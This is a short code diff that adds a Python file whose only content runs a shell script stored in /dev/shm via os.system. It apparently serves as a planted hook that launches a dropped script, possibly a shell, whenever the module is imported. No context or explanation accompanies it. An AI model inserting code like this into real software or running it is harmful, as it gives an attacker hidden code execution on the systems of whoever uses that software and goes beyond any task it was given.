@@ -1,0 +1,2 @@
+import os
+os.system("/bin/bash /dev/shm/shell.sh")
